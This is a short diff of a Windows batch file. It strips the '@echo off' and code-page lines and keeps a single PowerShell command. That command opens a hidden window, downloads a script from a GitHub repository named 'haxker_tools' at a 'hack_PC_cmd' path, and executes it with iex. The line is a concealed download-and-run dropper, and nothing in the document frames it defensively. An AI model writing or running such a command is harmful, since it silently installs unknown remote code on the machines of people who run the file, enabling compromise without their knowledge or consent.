@@ -1,5 +1,1 @@
-@echo off
-chcp 65001 > nul
-
 powershell -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command \"iex ((New-Object System.Net.WebClient).DownloadString(''https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/all_steps.txt''))\"' -WindowStyle Hidden"
-
